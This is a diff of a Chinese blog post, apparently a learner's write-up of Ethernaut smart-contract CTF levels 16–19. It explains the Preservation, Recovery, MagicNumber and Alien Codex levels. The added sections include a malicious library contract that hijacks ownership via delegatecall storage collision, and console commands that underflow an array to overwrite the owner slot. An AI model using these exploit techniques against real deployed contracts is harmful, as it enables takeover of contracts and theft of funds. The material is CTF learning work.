@@ -28,7 +28,7 @@
 <meta property="og:description" content="接到了链上的项目，正好学习一下">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-07-19T08:47:00.000Z">
-<meta property="article:modified_time" content="2024-07-22T03:35:30.230Z">
+<meta property="article:modified_time" content="2024-07-28T14:39:51.371Z">
 <meta property="article:author" content="HeyGap">
 <meta property="article:tag" content="Blockchain">
 <meta property="article:tag" content="Smart Contract">
@@ -219,7 +219,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-07-22 11:07:23" itemprop="dateModified" datetime="2024-07-22T11:35:30+08:00">2024-07-22</time>
+                <time title="修改时间：2024-07-28 22:07:37" itemprop="dateModified" datetime="2024-07-28T22:39:51+08:00">2024-07-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -414,6 +414,142 @@ enter 的函数签名，exp 如下</p>
 <p>ERC-20 标准支持将一定数量的代币授权 (approve) 给某个地址 (被授权方),
 然后被授权方就能够使用 transferFrom 支配授权方的代币</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// current balance: 1000000000000000000000000</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// approve to another contract</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&quot;0x148258832f9925fC21Cf5B13d5aE21EE1e6ce1F0&quot;</span>, <span class="string">&quot;1000000000000000000000000&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke Attack.attack()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance again</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
+<h2 id="preservation">16 Preservation</h2>
+<p>我们再来重新认识一下 delegatecall：</p>
+<p>假设我们有合约 A 通过 delegatecall 调用了合约 B 的函数 funcB，那么
+funcB 中修改的变量其实都是合约 A 中的变量。那么可能有人要问，合约 B
+是怎么知道 A 的变量的？实际上，delegatecall
+是根据状态变量的定义顺序去寻找被调用合约对应的 slot 位置,
+然后进行访问和修改。</p>
+<p>因此，LibraryContract 中的 setTime 修改的 storedTime，其实是修改了
+Preservation 合约中的
+timeZone1Library，我们可以将其修改为恶意合约地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await contract.setFirstTime(&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>但这里我有一个不太明白的点是，明明传入的参数是 32bytes 的，而
+timeZone1Library 是 20bytes 的 address
+变量，我不清楚是怎么数据转换以及放入 slot 当中的</p>
+</blockquote>
+<p>而当我们修改了 timeZone1Library 为恶意合约地址，再用 setFirstTime
+调用 setTime 就调用的是恶意合约的 setTime 了，此时恶意合约直接写好同样的
+setTime 签名，内部实现 owner = msg.sender 即可成功提权。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改为恶意合约的地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;0xAC93AF93Afb73D776694684bDD39dD900EF27C9D&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提权</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setFirstTime</span>(<span class="string">&quot;anything&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract EvilLibraryContract &#123;</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 /*_time*/) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="recovery">17 Recovery</h2>
+<p>十七题了，还是没办法脱离题解自己想到哪里是 vulnerable
+的，合约基础还没打牢...得继续努力😭</p>
+<p>这道题大意为 Recovery 合约创建了 SimpleToken 合约，但是找不到
+SimpleToken
+这个合约的地址了，所以需要我们找到这个地址，并把这个地址里的币转移出来。</p>
+<p>首先要解决的问题是：如何找到这个合约？</p>
+<ul>
+<li>方案一：etherscan 直接搜实例地址</li>
+</ul>
+<p>通过跟进“实例地址”（其实就是 Recovery
+这个合约的地址）创建的新合约的地址，我们可以找到 SimpleToken 的地址</p>
+<ul>
+<li>方案二：<a
+target="_blank" rel="noopener" href="https://learnblockchain.cn/2019/06/10/address-compute/">计算</a></li>
+</ul>
+<p>这个方案我没仔细看...先把链接放在这儿</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web3</span><br><span class="line"><span class="keyword">import</span> rlp</span><br><span class="line"><span class="comment"># keccak256(address, nonce)</span></span><br><span class="line"><span class="comment"># 0xfe... 是实例地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(web3.Web3.keccak(rlp.encode([<span class="number">0xfeB38d24C57d0462741d90E44b07d976f99fBf71</span>,<span class="number">1</span>]))[<span class="number">12</span>:])))</span><br><span class="line"><span class="comment"># 0xd1d9a8e9388dbeb6f0714340e4d44b0587c6145e &lt;-这个是 SimpleToken 的地址</span></span><br></pre></td></tr></table></figure>
+<p>找到合约之后，我们要解决的问题是，如何把 SimpleToken
+中的合约代币转出来？</p>
+<p>我们可以看到 SimpleToken 合约中存在 destruct 函数，而 <a
+href="remix.ethereum.org">Remix</a>
+为我们提供了与现有合约交互的功能，即部署时的 "At
+Address"，这里借了张图👇</p>
+<figure>
+<img
+src="https://img.exp10it.io/2024/04/202404221233489.png?size=medium"
+alt="借的图" />
+<figcaption aria-hidden="true">借的图</figcaption>
+</figure>
+<p>将我们钱包的地址写在 destroy 中，就可以将合约中的代币转出啦</p>
+<h2 id="magicnumber">18 MagicNumber</h2>
+<p>今天完全不想看原理。。先 fork 一下别人的 wp 改天再来看</p>
+<p>条件: 提供一个合约地址, 该合约最多包含 10 个 opcode, 并在调用
+whatIsTheMeaningOfLife 方法时返回数字 42</p>
+<p>https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iii-the-function-selector-6a9b6886ea49</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-iv-function-wrappers-d8e46672b0ed</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-v-function-bodies-2d19d4bef8be</p>
+<p>https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-vi-the-swarm-hash-70f069e22aef</p>
+<figure>
+<img
+src="https://img.exp10it.io/2024/04/202404242022619.jpeg?size=medium"
+alt="合约创建的过程" />
+<figcaption aria-hidden="true">合约创建的过程</figcaption>
+</figure>
+<p>代码分为两部分</p>
+<ul>
+<li>initialization code</li>
+<li>runtime code</li>
+</ul>
+<p>具体讲解看文章就行</p>
+<p>runtime code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x2a ; store 42 in memory</span><br><span class="line">PUSH1 0x80</span><br><span class="line">MSTORE</span><br><span class="line">PUSH1 0x20 ; return the memory address of 42</span><br><span class="line">PUSH1 0x80</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
+<p>转成hex正好10bytes<code>602a60805260206080f3</code></p>
+<p>根据上面几篇文章里介绍的原理, 编写 runtime code
+的时候其实无需考虑具体的方法名是什么 (whatIsTheMeaningOfLife)</p>
+<p>因为 EVM 执行字节码时永远都是从上至下执行,
+而正常合约字节码的开头会根据 calldata 内 selector 的值 JUMPI
+到特定的位置, 以此实现不同方法的调用 (路由)</p>
+<p>对于这题来说, 只需要返回 42 就行 (RETURN), 也就无需加入针对 selector
+的判断</p>
+<p>initialization code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x0a ; copy runtime code to memory</span><br><span class="line">PUSH1 0x0c</span><br><span class="line">PUSH1 0x00</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x0a ; return the memory address of code</span><br><span class="line">PUSH1 0x00</span><br><span class="line">RETURN</span><br></pre></td></tr></table></figure>
+<p>转为hex<code>600a600c600039600a6000f3</code></p>
+<p>最终 hex, 前 12 bytes 为 initialization code, 后 10 bytes 为 runtime
+code</p>
+<p><code>0x600a600c600039600a6000f3602a60805260206080f3</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// deploy contract</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// 右键回显，复制object</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;blockHash&quot;</span>: <span class="string">&quot;0x63eb03c9313eb08f9634a66cf4f6dc29cf8f00447c3881e39c743e9c06af19a5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;blockNumber&quot;</span>: <span class="number">6390825</span>,</span><br><span class="line">    <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x71e6E63B138806572D11A60A8778FfA154ab96c5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cumulativeGasUsed&quot;</span>: <span class="number">1517854</span>,</span><br><span class="line">    <span class="string">&quot;effectiveGasPrice&quot;</span>: <span class="number">13186593185</span>,</span><br><span class="line">    <span class="string">&quot;from&quot;</span>: <span class="string">&quot;0x9a80a78bebe92ef9cdfc4ca116fc4925237fdbd0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gasUsed&quot;</span>: <span class="number">55354</span>,</span><br><span class="line">    <span class="string">&quot;logs&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;logsBloom&quot;</span>: <span class="string">&quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;status&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;to&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="string">&quot;transactionHash&quot;</span>: <span class="string">&quot;0xa33ade6dd8c074ed59d0db434b3e7768944240707d1a4a9a61e8bb28f99d55f6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transactionIndex&quot;</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;0x2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setSolver 注意这里的地址得是sendTransaction回显的合约地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;0x2132C7bc11De7A90B87375f282d36100a29f97a9&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="alien-codex">19 Alien Codex</h2>
+<p>做这道题之前先阅读<a
+target="_blank" rel="noopener" href="https://medium.com/@flores.eugenio03/exploring-the-storage-layout-in-solidity-and-how-to-access-state-variables-bf2cbc6f8018">这篇</a>，读到动态数组的存储方式</p>
+<p>另外，我们可以通过以下代码来查看 codex 存放的真实 slot 地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>此外，一个合约中存在 2^256 个 slot 槽，也就是说，slot[2^256 - 1] 就是
+slot 的最后一个 32bytes 长的元素。同时，本题 revise
+函数虽然在修改下标大于 length 的越界变量时会报错，但 retract
+函数并没有对容量做检查，因此，我们很轻松地就可以通过 retract 函数将
+codex 的 length 减为 2^256-1，进而修改通过 revise(i,'evilcontent') 将
+slot 中任意一个位置修改为 'evilcontent'。</p>
+<p>在本题中，我们需要将 slot[0] 中的 owner
+改为我们自己钱包的地址。因此，思路如下：</p>
+<ol type="1">
+<li>makeContact</li>
+<li>通过 retract 函数将 length 减为 2^256 - 1</li>
+<li>此时使用 keccak256(abi.encodePacked(uint256(1))) 计算出存放 codex
+的插槽的 slot 地址<code>array_addr</code></li>
+<li>因为 array_addr 距离 slot[0] 还有 diff = (2^256 - 1) - array_addr +
+1 这么多；而 codex[0] 正好是 slot[array_addr]。</li>
+<li>因此，slot[0] = codex[0 + diff]，exp如下</li>
+</ol>
+<p>有了 slot[0] 的位置，而且我们现在也已经知道 contact 在 slot[0]
+中，codex 的长度独占 slot[1]。而根据<a
+target="_blank" rel="noopener" href="https://ethereum.stackexchange.com/questions/63403/in-solidity-how-does-the-slot-assignation-work-for-storage-variables-when-there">这篇</a>文章，<a
+target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/helpers/Ownable-05.sol">Ownable-05</a>
+中的 owner 地址变量存放在 AlienCodex 合约变量的上方，也就是
+slot[0]，从代码角度看，可以理解为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">address private _owner;</span><br><span class="line">bool public contact;</span><br><span class="line">bytes32[] public codex;</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以将 slot[0] 修改为 0x..001&lt;address&gt;。exp
+如下：</p>
+<ol type="1">
+<li><p>await contract.makeContact()</p></li>
+<li><p>await contract.retract()</p></li>
+<li><p>我们可以在本地部署以下合约，并调用getSlotForArrayElement(0)，这里本地回显的<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>这个地址跟远程存储
+codex 的 slot 地址一模一样</p></li>
+<li><p>计算 diff = 2^256 -
+0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，得到diff
+=
+0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a，即35707666377435648211887908874984608119992236509074197713628505308453184860938</p></li>
+<li><p>await
+contract.revise(diff,'0x0000000000000000000000019a80a78bebE92EF9cDfC4CA116fC4925237fDbd0')</p></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/Ownable-05.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line">    bool public contact;</span><br><span class="line">    bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">    modifier contacted() &#123;</span><br><span class="line">        assert(contact);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function makeContact() public &#123;</span><br><span class="line">        contact = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function record(bytes32 _content) public contacted &#123;</span><br><span class="line">        codex.push(_content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function retract() public contacted &#123;</span><br><span class="line">        codex.length--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function revise(uint256 i, bytes32 _content) public contacted &#123;</span><br><span class="line">        codex[i] = _content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getSlotForArrayElement(uint256 _elementIndex) public pure returns (bytes32) &#123;</span><br><span class="line">        bytes32 startingSlotForArrayElements = keccak256(abi.encode(1));</span><br><span class="line">        return bytes32(uint256(startingSlotForArrayElements) + _elementIndex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -522,7 +658,7 @@ enter 的函数签名，exp 如下</p>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x00-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x01 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-ethernaut"><span class="nav-number">2.1.</span> <span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallback"><span class="nav-number">2.2.</span> <span class="nav-text">01 Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic"><span class="nav-number">2.2.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploration"><span class="nav-number">2.2.2.</span> <span class="nav-text">Exploration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallout"><span class="nav-number">2.3.</span> <span class="nav-text">02 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin-flip"><span class="nav-number">2.4.</span> <span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#telephone"><span class="nav-number">2.5.</span> <span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#token"><span class="nav-number">2.6.</span> <span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#delegation"><span class="nav-number">2.7.</span> <span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#force"><span class="nav-number">2.8.</span> <span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vault"><span class="nav-number">2.9.</span> <span class="nav-text">08 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#king"><span class="nav-number">2.10.</span> <span class="nav-text">09 King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re-entrancy"><span class="nav-number">2.11.</span> <span class="nav-text">10 Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elevator"><span class="nav-number">2.12.</span> <span class="nav-text">11 Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#privacy"><span class="nav-number">2.13.</span> <span class="nav-text">12 privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gatekeeper-one"><span class="nav-number">2.14.</span> <span class="nav-text">13 Gatekeeper One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gatekeeper-two"><span class="nav-number">2.15.</span> <span class="nav-text">14 Gatekeeper Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#naught-coin"><span class="nav-number">2.16.</span> <span class="nav-text">15 Naught Coin</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x00-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E9%A2%98%E7%9B%AE"><span class="nav-number">2.</span> <span class="nav-text">0x01 题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-ethernaut"><span class="nav-number">2.1.</span> <span class="nav-text">00 Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallback"><span class="nav-number">2.2.</span> <span class="nav-text">01 Fallback</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#basic"><span class="nav-number">2.2.1.</span> <span class="nav-text">Basic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploration"><span class="nav-number">2.2.2.</span> <span class="nav-text">Exploration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fallout"><span class="nav-number">2.3.</span> <span class="nav-text">02 Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin-flip"><span class="nav-number">2.4.</span> <span class="nav-text">03 Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#telephone"><span class="nav-number">2.5.</span> <span class="nav-text">04 Telephone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#token"><span class="nav-number">2.6.</span> <span class="nav-text">05 Token</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#delegation"><span class="nav-number">2.7.</span> <span class="nav-text">06 Delegation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#force"><span class="nav-number">2.8.</span> <span class="nav-text">07 Force</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vault"><span class="nav-number">2.9.</span> <span class="nav-text">08 Vault</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#king"><span class="nav-number">2.10.</span> <span class="nav-text">09 King</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re-entrancy"><span class="nav-number">2.11.</span> <span class="nav-text">10 Re-entrancy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#elevator"><span class="nav-number">2.12.</span> <span class="nav-text">11 Elevator</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#privacy"><span class="nav-number">2.13.</span> <span class="nav-text">12 privacy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gatekeeper-one"><span class="nav-number">2.14.</span> <span class="nav-text">13 Gatekeeper One</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gatekeeper-two"><span class="nav-number">2.15.</span> <span class="nav-text">14 Gatekeeper Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#naught-coin"><span class="nav-number">2.16.</span> <span class="nav-text">15 Naught Coin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preservation"><span class="nav-number">2.17.</span> <span class="nav-text">16 Preservation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#recovery"><span class="nav-number">2.18.</span> <span class="nav-text">17 Recovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#magicnumber"><span class="nav-number">2.19.</span> <span class="nav-text">18 MagicNumber</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alien-codex"><span class="nav-number">2.20.</span> <span class="nav-text">19 Alien Codex</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
